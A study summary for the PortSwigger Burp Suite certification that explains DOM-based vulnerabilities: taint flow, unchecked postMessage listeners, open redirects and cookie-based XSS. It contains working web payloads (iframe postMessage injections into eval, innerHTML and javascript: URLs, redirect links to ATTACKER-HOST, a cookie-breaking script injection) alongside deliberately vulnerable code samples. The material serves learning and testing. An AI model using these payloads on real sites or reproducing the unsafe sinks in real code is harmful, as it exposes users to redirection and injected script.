##### PortSwigger BurpSuite Certification Summary
# DOM-Based Vulnerabilities
A DOM-based attack can arise when there is an attacker controllable source that is processed in an unsafe way by the system. The latter step happens in the so-called sink, such as the `eval()` function or `innerHTML`. The propagation of malicious input to an unsafe sink is called taint flow.

Consider the following code example:
```
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```
The `location` object references the URL, which is easily controlled by an adversary. The code splits the URL at the hash sign and then checks if `https:` is a prefix of the link. Therefore, an attacker can construct a link that redirects the victim to an arbitrary site:
```
https://VITCTIM-HOST#https://ATTACKER-HOST
```
Setting the `location` object automatically redirects the user to the supplied URL.

## Web Message Source
If there is an event listener that does not properly check the source of the event it is listening for, an attack might be able to use this. The crafted message from the attacker could be passed by the event listener to a sink, thus enabling a DOM-based attack.
For example:
```
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```
does not verify the origin of the message, enabling code to be passed to `eval()`:
```
<iframe src="VICTIM-HOST" onload="this.contentWindow.postMessage('print()','*')">
```
The JS syntax is `postMessage(message, targetOrigin)`.

In case the website offers `innerHTML` as a sink, the payload can look something like this:
```
... onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
Yet another example is the `location.href` context. This method sets the URL and can therefore execute JS code:
```
<iframe src="VICTIM-HOST" onload="this.contentWindow.postMessage('javascript:print()','*')">
```
It can be necessary to change the quotes in use, for example when they are used within the payload. An example is JSON:
```
<iframe src="VICTIM-HOST" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\" }","*")'>
```
## Open Redirect
Let there be a function which takes a URL parameter and sets the `href` of a link accordingly:
```
<div class="is-linkback">
	<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location);
	if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back</a></div>
```
This functionality takes the `url` parameter and sets it as the link to follow when clicking the "Back" button if the format is correct. Therefore, an attacker only has to append a malicious link as the parameter to make the victim be redirected:
```
https://VICTIM-HOST?url=https://ATTACKER-HOST
```
The victim will first reach the usual website, but upon clicking "Back", will be taken to the attacker host.

The main sinks are:
  * location
  * location.host
  * location.hostname
  * location.href
  * location.pathname
  * location.search
  * location.protocol
  * location.assign()
  * location.replace()
  * open()
  * element.srcdoc
  * XMLHttpRequest.open()
  * XMLHttpRequest.send()
  * jQuery.ajax()
  * $.ajax()

## Cookie Manipulation
Writing user controllable data into a cookie is also useful for an attacker. For example, the cookie value can be used to store the last viewed product:
```
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'


<a href='_lastViewdProduct_'>Last viewed product</a>
```
So the goal is to perform XSS when the last viewed product link is clicked. We can escape the `<a>` tag and insert a script; This should be set as the link for the victim to click. Afterwards, it makes sense to direct the victim to the original site (with the malicious link set):
```
<iframe src="VICTIM-HOST&'><script>print()</script>" onload="if(!window.x)this.src='VICTIM-HOST';window.x=1;">
```
